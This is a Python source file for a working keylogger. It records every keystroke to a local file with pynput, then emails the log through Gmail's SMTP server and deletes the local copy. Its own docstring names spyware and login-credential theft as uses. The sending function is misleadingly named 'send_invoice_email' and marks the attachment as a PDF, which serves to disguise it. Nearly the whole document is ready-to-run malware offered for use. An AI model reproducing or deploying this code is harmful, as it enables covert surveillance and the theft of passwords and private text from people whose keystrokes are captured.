'''
Keyloggers are programs that capture your key strokes. They can be used to keep logs of everything you press
    on the keyboard and can be used for malicious purposes, i.e.: spyware, stealing login credentials.

Current keyloggers have lots of functionalities. They record and display the exact date and time of each keystroke,
    on which application the keystrokes were entered, easy-to-read logs, etc.

This program is simply a basic keylogger with limited functionality, which are to:
-> Capture and save your keystrokes to a "keylogger.txt" file
-> Send the contents of the file to your email (sender email is gmail with no two-factor authentication)

To run: Open the file in terminal and enter "python keylogger.py".
To escape: Press Esc key to exit the keylogger.

Modules used:
-> smtplib (pre-installed on Python)
-> ssl (pre-installed on Python)
-> pynput (requires installation with "pip install pynput")
'''
import smtplib
import os
import ssl
from pynput import keyboard
from email.message import EmailMessage
def write(text):
    with open("keylogger.txt", 'a') as f:
        f.write(text)
        f.close()
def on_key_press(Key):
    try:
        if (Key == keyboard.Key.enter):
            write("\n")
        else:
            write(Key.char)
    except AttributeError:
        if Key == keyboard.Key.backspace:
            write("\nBackspace Pressed\n")
        elif (Key == keyboard.Key.tab):
            write("\nTab Pressed\n")
        elif (Key == keyboard.Key.space):
            write(" ")
        else:
            temp = repr(Key)+" Pressed.\n"
            write(temp)
            print("\n{} Pressed\n".format(Key))
def on_key_release(Key):
    if (Key == keyboard.Key.esc):
        return False
def send_invoice_email():
    sender_mail = "YOUR SENDER GMAIL"
    receiver_mail = "YOUR RECEIVER MAIL"
    password = "YOUR APP PASSCODE"
    
    msg = EmailMessage()
    msg['From'] = sender_mail
    msg['To'] = receiver_mail
    msg['Subject'] = "KeyLogs"
    msg.set_content("Keylogs attached")
    
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()
    
    with open(r"keylogger.txt", "rb") as f:
        file_data = f.read()
    
    msg.add_attachment(file_data,
                        maintype="application",
                        subtype="pdf",
                        filename="keylogger.txt")

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_mail, password)
        server.sendmail(sender_mail, receiver_mail, msg.as_string())
        print("Email Sent to", receiver_mail)
        os.remove(r"keylogger.txt")  
send_invoice_email()
